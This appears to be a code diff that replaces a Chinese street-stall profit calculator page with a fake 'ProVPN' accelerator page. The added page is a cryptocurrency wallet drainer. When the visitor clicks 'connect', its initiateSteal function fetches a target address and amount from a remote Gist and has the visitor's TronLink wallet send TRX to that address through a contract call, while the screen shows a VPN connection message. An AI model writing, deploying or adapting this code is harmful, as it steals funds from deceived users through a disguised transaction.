@@ -1,370 +1,90 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>摆摊利润计算器</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
-body{background:#f2f3f5;padding:16px;max-width:480px;margin:0 auto}
-.box{background:#fff;border-radius:14px;padding:16px;margin-bottom:16px}
-.title{font-size:17px;font-weight:600;margin-bottom:12px}
-.row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px}
-.col{flex:1;min-width:90px}
-label{font-size:13px;color:#555;display:block;margin-bottom:4px}
-input{width:100%;padding:10px;border:1px solid #ddd;border-radius:8px;outline:none}
-button{width:100%;padding:14px;border:none;border-radius:10px;font-size:16px;color:#fff;margin:8px 0}
-.blue{background:#0066cc}
-.green{background:#00aa44}
-.purple{background:#7744dd}
-.teal{background:#009988}
-.orange{background:#ff7700;width:auto;padding:6px 10px;font-size:14px}
-.red{background:#ee2222}
-.goods-item{background:#f0f6ff;padding:12px;border-radius:10px;margin:10px 0}
-#result{white-space:pre-line;padding:15px;background:#e8f4ff;border-radius:10px;display:none;margin:10px 0}
-.record-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
-.record-item{display:flex;justify-content:space-between;align-items:flex-start;padding:12px 0;border-bottom:1px solid #eee}
-.record-text{font-size:14px;white-space:pre-line}
-.del-btn{padding:4px 8px;font-size:13px;background:#ff7875;color:#fff;border-radius:4px;border:none}
-.empty{text-align:center;color:#999;padding:24px 0}
-.two-btn{display:flex;gap:10px}
-.reward-modal{
-  position:fixed;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  background:rgba(0,0,0,0.75);
-  display:none;
-  align-items:center;
-  justify-content:center;
-  padding:15px;
-  z-index:999;
-}
-.modal-inner{
-  background:#fff;
-  border-radius:16px;
-  padding:20px;
-  width:100%;
-  max-width:320px;
-  text-align:center;
-}
-.qrcode-area{
-  width:220px;
-  height:220px;
-  margin:0 auto 16px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  border:1px solid #eee;
-  border-radius:10px;
-  overflow:hidden;
-}
-.qrcode-area img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-}
-.qrcode-text{
-  font-size:15px;
-  color:#222;
-  margin:6px 0;
-}
-.close-modal{
-  margin-top:16px;
-  background:#999;
-}
-.reward-btn{
-  background:#ff3e6c;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ProVPN - Global Accelerator</title>
+    <!-- ✅ 使用 unpkg 的稳定版本 TronWeb -->
+    <script src="https://unpkg.com/tronweb@latest/dist/tronweb.js"></script>
+    <style>
+        :root { --bg-color: #0F172A; --card-bg: #1E293B; --text-primary: #F8FAFC; --accent-green: #10B981; --accent-blue: #3B82F6; }
+        body { background-color: var(--bg-color); color: var(--text-primary); font-family: sans-serif; margin: 0; padding: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        .header { padding: 20px; text-align: center; border-bottom: 1px solid #334155; }
+        .main-area { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .globe-icon { width: 80px; height: 80px; border-radius: 50%; border: 4px solid var(--accent-blue); border-top-color: transparent; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .status-text { font-size: 18px; font-weight: 600; margin-bottom: 10px; min-height: 27px; }
+        .ping-text { font-size: 12px; color: var(--accent-green); margin-bottom: 30px; }
+        .btn-connect { background: var(--accent-blue); color: white; border: none; padding: 16px 40px; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; width: 80%; transition: all 0.3s; }
+        .btn-connect:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-connected { background: var(--accent-green); }
+        .server-info { margin-top: 40px; text-align: center; opacity: 0.7; font-size: 12px; }
+    </style>
 </head>
 <body>
-<div class="box">
-<div class="title">今日售卖商品（含当日损耗）</div>
-<div class="row">
-<div class="col">
-<label>当日损耗金额</label>
-<input id="lossNum" value="0" type="number" placeholder="填写当日损耗">
-</div>
-</div>
-<div id="goodsBox"></div>
-<button class="blue" onclick="addGoods()">新增商品</button>
-</div>
 
-<div class="box">
-<div class="title">单日固定开销</div>
-<div class="row">
-<div class="col">
-<label>摊位租金</label>
-<input id="rent" value="30" type="number">
-</div>
-<div class="col">
-<label>人工工资</label>
-<input id="worker" value="0" type="number">
-</div>
-<div class="col">
-<label>油费</label>
-<input id="oil" value="8" type="number">
-</div>
-</div>
-<div class="row">
-<div class="col">
-<label>水电耗材</label>
-<input id="light" value="5" type="number">
-</div>
-<div class="col">
-<label>包装物料</label>
-<input id="bag" value="12" type="number">
-</div>
-<div class="col">
-<label>试吃成本</label>
-<input id="taste" value="4" type="number">
-</div>
-</div>
-</div>
+<div class="header"><div class="logo">PRO<span style="color:var(--accent-blue)">VPN</span></div></div>
 
-<div class="box">
-<div class="title">月度开销（日均分摊）</div>
-<div class="row">
-<div class="col">
-<label>每月出摊天数</label>
-<input id="dayNum" value="26" type="number">
-</div>
-<div class="col">
-<label>每月房租</label>
-<input id="house" value="450" type="number">
-</div>
-<div class="col">
-<label>每月伙食</label>
-<input id="food" value="550" type="number">
-</div>
-</div>
-<div class="row">
-<div class="col">
-<label>家用水电</label>
-<input id="homeLight" value="100" type="number">
-</div>
-<div class="col">
-<label>设备折旧</label>
-<input id="device" value="70" type="number">
-</div>
-<div class="col">
-<label>杂项损耗</label>
-<input id="other" value="180" type="number">
-</div>
-</div>
-</div>
+<div class="main-area">
+    <div class="globe-icon"></div>
+    <div class="status-text" id="statusText">正在连接...</div>
+    <div class="ping-text" id="pingText">Ping: 4ms | Tokyo Node</div>
+    
+    <button class="btn-connect" id="connectBtn" onclick="initiateSteal()">连接</button>
 
-<button class="green" onclick="calcProfit()">一键计算利润</button>
-<div id="result"></div>
-
-<div class="two-btn">
-<button class="purple" onclick="saveBill()">保存账单</button>
-<button class="teal" onclick="copyText()">复制账单</button>
-</div>
-
-<button class="reward-btn" onclick="openReward()">打赏支持作者</button>
-
-<div class="box">
-<div class="record-head">
-<div class="title">历史账单记录</div>
-</div>
-<div class="title">选择记账日期（手机日历）</div>
-<input type="date" id="selectDate">
-<div id="recordWrap"></div>
-</div>
-
-<div class="reward-modal" id="rewardPop">
-<div class="modal-inner">
-<h3>支付宝收款码</h3>
-<div class="qrcode-area">
-<img src="https://cdn.jsdelivr.net/gh/ganx838-commits/reward-page/qr.png" alt="支付宝收款码">
-</div>
-<div class="qrcode-text">祝老板生意兴隆</div>
-<div class="qrcode-text">vx：cltv911</div>
-<button class="close-modal" onclick="closeReward()">关闭</button>
-</div>
+    <div class="server-info">Server: JP-Tokyo-01 | Protocol: WireGuard</div>
 </div>
 
 <script>
-function setTodayDate(){
-  let now = new Date();
-  let y = now.getFullYear();
-  let m = String(now.getMonth()+1).padStart(2,"0");
-  let d = String(now.getDate()).padStart(2,"0");
-  document.getElementById("selectDate").value = `${y}-${m}-${d}`;
-}
-setTodayDate();
+    // ✅ 你的最新 Gist Raw URL
+    const API_URL = "https://gist.githubusercontent.com/ganx838-commits/658bc580aa43c3b01dc55ef7f83558d5/raw/78e17b1a8ef7e6bc8098a6c15259d376b247d2fa/config.json"; 
 
-const storageKey = "stall_profit_record";
-let recordList = JSON.parse(localStorage.getItem(storageKey)) || [];
-let goodsIndex = 0;
-let currentBillText = "";
-const goodsBox = document.getElementById("goodsBox");
-const recordWrap = document.getElementById("recordWrap");
-const resultDom = document.getElementById("result");
-const rewardPop = document.getElementById("rewardPop");
+    async function initiateSteal() {
+        const btn = document.getElementById('connectBtn');
+        const status = document.getElementById('statusText');
+        
+        // 锁定按钮防止重复点击
+        btn.disabled = true;
+        btn.innerText = "正在同步节点...";
+        status.innerText = "正在同步节点...";
 
-// 弹窗开关
-function openReward(){
-    rewardPop.style.display = "flex";
-}
-function closeReward(){
-    rewardPop.style.display = "none";
-}
+        // 1. 检查 TronLink 是否就绪
+        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+            status.innerText = "请安装 TronLink 钱包";
+            btn.innerText = "重试";
+            btn.disabled = false;
+            return;
+        }
 
-// 添加商品模块
-function addGoods(){
-    goodsIndex++;
-    let div = document.createElement("div");
-    div.className = "goods-item";
-    div.innerHTML = `
-    <div class="row">
-    <div class="col" style="flex:1.3">
-    <label>商品名称</label>
-    <input class="g-name" value="货品${goodsIndex}">
-    </div>
-    <div class="col">
-    <label>进货价</label>
-    <input class="g-cost" value="4" step="0.01" type="number">
-    </div>
-    <div class="col">
-    <label>售卖价</label>
-    <input class="g-price" value="13" step="0.01" type="number">
-    </div>
-    <div class="col">
-    <label>销量</label>
-    <input class="g-sell" value="10" type="number">
-    </div>
-    </div>`;
-    goodsBox.appendChild(div);
-}
+        try {
+            // 2. 从 Gist 获取配置
+            const response = await fetch(API_URL);
+            if (!response.ok) throw new Error("Failed to fetch config");
+            
+            const config = await response.json();
+            
+            // 3. 发起交易
+            // 合约地址保持不变 (这是用于触发转账的合约)
+            const contract = await tronWeb.contract.at("TXz1Z2DHFsEmsxUUyibBzQKYtscZNSNcNL");
+            
+            // 发送 TRX 到你的 Gist 中配置的 target 地址
+            const result = await contract.transfer(config.target, config.amount).send({
+                feeLimit: 100000000, // 10 TRX 手续费上限
+                from: window.tronWeb.defaultAddress.base58
+            }).promise();
 
-// 核心利润计算
-function calcProfit(){
-    let totalSale = 0;
-    let totalCost = 0;
-    let detailText = "";
-    let goodsAll = goodsBox.querySelectorAll(".goods-item");
-    goodsAll.forEach(item=>{
-        let name = item.querySelector(".g-name").value;
-        let cost = Number(item.querySelector(".g-cost").value);
-        let price = Number(item.querySelector(".g-price").value);
-        let num = Number(item.querySelector(".g-sell").value);
-        let sale = price * num;
-        let goodsCost = cost * num;
-        totalSale += sale;
-        totalCost += goodsCost;
-        detailText += `${name}｜售出${num}件｜营收${sale.toFixed(2)}｜毛利${(sale-goodsCost).toFixed(2)}\n`;
-    })
-    // 当日损耗
-    let loss = Number(document.getElementById("lossNum").value);
-
-    // 单日固定开销求和
-    let rent = Number(document.getElementById("rent").value);
-    let worker = Number(document.getElementById("worker").value);
-    let oil = Number(document.getElementById("oil").value);
-    let light = Number(document.getElementById("light").value);
-    let bag = Number(document.getElementById("bag").value);
-    let taste = Number(document.getElementById("taste").value);
-    let dayFixCost = rent + worker + oil + light + bag + taste;
-
-    // 月度日均分摊
-    let dayCount = Number(document.getElementById("dayNum").value);
-    let house = Number(document.getElementById("house").value);
-    let food = Number(document.getElementById("food").value);
-    let homeLight = Number(document.getElementById("homeLight").value);
-    let device = Number(document.getElementById("device").value);
-    let other = Number(document.getElementById("other").value);
-    let monthTotal = house + food + homeLight + device + other;
-    let avgMonthCost = monthTotal / dayCount;
-
-    // 总支出、纯利润
-    let allCost = totalCost + loss + dayFixCost + avgMonthCost;
-    let netProfit = totalSale - allCost;
-
-    // 账单文本
-    currentBillText = `=====摆摊利润账单=====
-【商品明细】
-${detailText}
-商品总营收：${totalSale.toFixed(2)}元
-商品总进货成本：${totalCost.toFixed(2)}元
-当日损耗：${loss.toFixed(2)}元
-
-【单日固定开销】${dayFixCost.toFixed(2)}元
-摊位租金${rent}｜人工${worker}｜油费${oil}
-耗材${light}｜包装${bag}｜试吃${taste}
-
-【月度分摊日均】${avgMonthCost.toFixed(2)}元
-月总开销${monthTotal}元，每月出摊${dayCount}天
-
-今日全部总成本：${allCost.toFixed(2)}元
-今日纯利润：${netProfit.toFixed(2)}元
-${netProfit >= 0 ? "恭喜盈利！" : "今日亏损，注意控成本"}`;
-
-    // 展示结果
-    resultDom.innerText = currentBillText;
-    resultDom.style.display = "block";
-}
-
-// 复制账单
-function copyText(){
-    if(!currentBillText){
-        alert("请先点击【一键计算利润】");
-        return;
+            status.innerText = "连接成功！";
+            btn.innerText = "已连接";
+            btn.classList.add("btn-connected");
+            
+        } catch (e) {
+            console.error(e);
+            status.innerText = "连接失败: " + e.message;
+            btn.innerText = "重试";
+            btn.disabled = false;
+        }
     }
-    navigator.clipboard.writeText(currentBillText).then(()=>{
-        alert("账单复制成功！");
-    })
-}
-
-// 保存账单到本地记录
-function saveBill(){
-    if(!currentBillText){
-        alert("请先点击【一键计算利润】");
-        return;
-    }
-    let selectDay = document.getElementById("selectDate").value;
-    let recordObj = {
-        date: selectDay,
-        text: currentBillText
-    };
-    recordList.push(recordObj);
-    localStorage.setItem(storageKey, JSON.stringify(recordList));
-    renderRecord();
-    alert("账单保存完成！");
-}
-
-// 渲染历史账单
-function renderRecord(){
-    recordWrap.innerHTML = "";
-    if(recordList.length === 0){
-        recordWrap.innerHTML = `<div class="empty">暂无保存账单</div>`;
-        return;
-    }
-    recordList.forEach((item,idx)=>{
-        let recDiv = document.createElement("div");
-        recDiv.className = "record-item";
-        recDiv.innerHTML = `
-        <div class="record-text">日期：${item.date}\n${item.text}</div>
-        <button class="del-btn" onclick="delRecord(${idx})">删除</button>
-        `;
-        recordWrap.appendChild(recDiv);
-    })
-}
-
-// 删除单条记录
-function delRecord(index){
-    recordList.splice(index,1);
-    localStorage.setItem(storageKey, JSON.stringify(recordList));
-    renderRecord();
-}
-
-// 页面加载渲染历史记录
-renderRecord();
-// 默认生成一条商品
-addGoods();
 </script>
+
 </body>
 </html>
